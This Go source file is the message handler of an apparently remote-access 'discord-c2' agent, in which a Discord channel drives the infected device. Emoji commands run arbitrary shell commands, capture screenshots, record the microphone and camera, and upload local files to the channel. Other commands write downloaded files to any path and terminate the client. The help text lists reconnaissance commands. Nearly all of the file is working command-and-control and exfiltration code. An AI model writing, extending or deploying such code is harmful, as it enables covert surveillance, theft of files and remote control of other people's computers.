package bot

// This file contains the message handler used for emoji and text shortcuts in
// the per-device channel.

import (
	"io"
	"log"
	"os"
	"strings"

	"discord-c2/internal/commands"
	"discord-c2/internal/httpx"
	"discord-c2/internal/jobs"
	"discord-c2/internal/media"
	"discord-c2/internal/transfer"

	"github.com/bwmarrin/discordgo"
)

// handler processes messages in the per-device channel, wiring emoji and text
// shortcuts to the same capabilities exposed via slash commands.
func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.ChannelID != deviceChannel() || m.Author.ID == s.State.User.ID {
		return
	}
	if !userAllowed(m.Author.ID) {
		log.Printf("ignoring message from unauthorized user %s", m.Author.ID)
		return
	}

	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐")
	flag := 0

	switch {
	case strings.HasPrefix(m.Content, "🏃‍♂️"):
		cmdStr := strings.TrimSpace(strings.TrimPrefix(m.Content, "🏃‍♂️"))
		if cmdStr == "" {
			s.ChannelMessageSendReply(m.ChannelID, "Usage: 🏃‍♂️ <command>", m.Reference())
			break
		}
		if commands.ApprovalRequired() {
			if err := commands.RequestApprovalMessage(s, m.Author.ID, m.ChannelID, cmdStr); err != nil {
				s.ChannelMessageSendReply(m.ChannelID, "❌ "+err.Error(), m.Reference())
				break
			}
		} else {
			startShortcutJob(s, m, cmdStr)
		}
		flag = 1
	case m.Content == "help":
		sendQuickHelp(s, m)
		flag = 1

	case m.Content == "📸":
		log.Printf("SCREENSHOT emoji trigger: channel=%s", m.ChannelID)
		media.Screenshot(s, m.ChannelID, m.Reference())
		flag = 1

	case m.Content == "🎙":
		log.Printf("MIC emoji trigger: channel=%s user=%s", m.ChannelID, m.Author.ID)
		media.MicRecord(s, m.ChannelID, m.Reference(), 10, "")
		flag = 1

	case m.Content == "📷":
		log.Printf("CAMERA emoji trigger: channel=%s user=%s", m.ChannelID, m.Author.ID)
		media.CameraSnapshot(s, m.ChannelID, m.Reference())
		flag = 1

	case strings.HasPrefix(m.Content, "👇"):
		flag = sendFileToChannel(s, m)

	case strings.HasPrefix(m.Content, "☝️"):
		flag = saveAttachment(s, m)

	case m.Content == "🔁":
		s.ChannelMessageSendReply(m.ChannelID, "🔁 Restarting client...", m.Reference())
		if err := restartClient(); err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Restart failed: "+err.Error(), m.Reference())
		}

	case m.Content == "💀":
		flag = 2
	}

	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
	if flag > 0 {
		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
		if flag > 1 {
			s.Close()
			os.Exit(0)
		}
	}
}

// sendFileToChannel uploads the local file named in a 👇 message, splitting it
// into parts when it exceeds the configured chunk size.
func sendFileToChannel(s *discordgo.Session, m *discordgo.MessageCreate) int {
	parts := strings.Fields(m.Content)
	if len(parts) < 2 {
		s.ChannelMessageSendReply(m.ChannelID, "Usage: 👇 <path>", m.Reference())
		return 0
	}

	fileName := expandHome(strings.TrimSpace(parts[1]))
	fi, err := os.Stat(fileName)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, "Cannot read file: "+fileName+" ("+err.Error()+")", m.Reference())
		return 0
	}
	if fi.IsDir() {
		s.ChannelMessageSendReply(m.ChannelID, fileName+" is a directory", m.Reference())
		return 0
	}

	if err := transfer.Send(s, m.ChannelID, m.Reference(), fileName, transferChunkSize); err != nil {
		s.ChannelMessageSendReply(m.ChannelID, "Upload failed: "+err.Error(), m.Reference())
		return 0
	}
	return 1
}

// saveAttachment downloads the first attachment of a ☝️ message to the given path.
func saveAttachment(s *discordgo.Session, m *discordgo.MessageCreate) int {
	parts := strings.Fields(m.Content)
	if len(parts) < 2 {
		s.ChannelMessageSendReply(m.ChannelID, "Usage: ☝️ <path> *attach", m.Reference())
		return 0
	}
	if len(m.Attachments) == 0 {
		return 0
	}

	path := expandHome(strings.TrimSpace(parts[1]))
	out, err := os.Create(path)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, "Cannot create file: "+path, m.Reference())
		return 0
	}
	defer out.Close()

	resp, err := httpx.Client.Get(m.Attachments[0].URL)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, "Download failed: "+err.Error(), m.Reference())
		return 0
	}
	defer resp.Body.Close()

	if _, err := io.Copy(out, resp.Body); err != nil {
		s.ChannelMessageSendReply(m.ChannelID, "Download failed: "+err.Error(), m.Reference())
		return 0
	}
	s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
	return 1
}

// startShortcutJob queues a 🏃‍♂️ command and replies with the job ID.
func startShortcutJob(s *discordgo.Session, m *discordgo.MessageCreate, cmd string) {
	if jobManager == nil {
		s.ChannelMessageSendReply(m.ChannelID, "Job manager is not configured.", m.Reference())
		return
	}
	job, err := jobManager.Start(m.Author.ID, m.ChannelID, cmd, 0)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, "❌ "+err.Error(), m.Reference())
		return
	}
	s.ChannelMessageSendReply(m.ChannelID, jobs.Ack(job), m.Reference())
}

func expandHome(path string) string {
	if !strings.HasPrefix(path, "~/") {
		return path
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return path
	}
	return home + string(os.PathSeparator) + path[2:]
}

func sendQuickHelp(s *discordgo.Session, m *discordgo.MessageCreate) {
	help := "**D‑C2 Quick Help**\n\n" +
		"Use these simple controls in this device channel:\n\n" +
		"**Screenshots**\n" +
		"Use `/screenshot` or click the Screenshot button to capture the screen.\n\n" +
		"**Quick info**\n" +
		"Buttons for `whoami`, `id`, `hostname` and IP info run suitable commands on this OS:\n" +
		"- Windows: whoami, hostname, ipconfig\n" +
		"- Linux/macOS: whoami, id, hostname, ip addr\n\n" +
		"**Files**\n" +
		"Use `/download` and `/upload` or the 👇/☝️ emoji commands for file transfer.\n\n" +
		"**More controls**\n" +
		"Advanced commands are available via slash commands (see `/help`).\n\n" +
		"Send `help` or `/help` anytime to show this help again."

	s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
		Content:    help,
		Reference:  m.Reference(),
		Components: quickHelpComponents(),
	})
}

func quickHelpComponents() []discordgo.MessageComponent {
	button := func(id, label string, emoji string, style discordgo.ButtonStyle) discordgo.Button {
		return discordgo.Button{
			CustomID: id,
			Label:    label,
			Emoji:    &discordgo.ComponentEmoji{Name: emoji},
			Style:    style,
		}
	}

	return []discordgo.MessageComponent{
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
			button("d2c_screenshot", "Screenshot", "📸", discordgo.PrimaryButton),
		}},
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
			button("d2c_q_whoami", "whoami", "🙍", discordgo.SecondaryButton),
			button("d2c_q_id", "id", "🆔", discordgo.SecondaryButton),
			button("d2c_q_hostname", "hostname", "💻", discordgo.SecondaryButton),
			button("d2c_q_ip", "ip info", "🌐", discordgo.SecondaryButton),
		}},
		discordgo.ActionsRow{Components: []discordgo.MessageComponent{
			button("d2c_q_cwd", "cwd", "📂", discordgo.SecondaryButton),
		}},
	}
}
